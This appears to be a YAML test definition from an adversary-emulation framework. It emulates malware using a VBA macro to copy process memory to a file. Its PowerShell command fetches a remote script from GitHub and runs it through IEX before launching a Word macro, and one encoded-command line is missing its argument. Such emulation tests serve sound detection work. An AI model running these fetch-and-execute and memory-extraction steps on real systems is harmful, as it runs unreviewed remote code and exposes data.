- id: 70400400-455b-58cf-afb1-a9d304f5c09a
  name: Soumaia ART Tests - Extract Memory via VBA
  description: 'This module attempts to emulate malware authors utilizing well known techniques to extract data from memory/binary files. To do this

    we first create a string in memory then pull out the pointer to that string. Finally, it uses this pointer to copy the contents of that

    memory location to a file stored in the $env:TEMP\atomic_t1059_005_test_output.bin.'
  tactic: execution
  technique:
    attack_id: T1059.005
    name: 'Command and Scripting Interpreter: Visual Basic'
  platforms:
    windows:
      psh:
        command: "powershell -NoProfile -EncodedCommand \nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA\n}\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-Maldoc -macroFile \".\\T1059_005-macrocode.txt\" -officeProduct \"Word\" -sub \"Extract\""
        cleanup: |-
          Remove-Item "$env:TEMP\atomic_t1059_005_test_output.bin" -ErrorAction Ignore
        payloads:
        - T1059_005-macrocode.txt
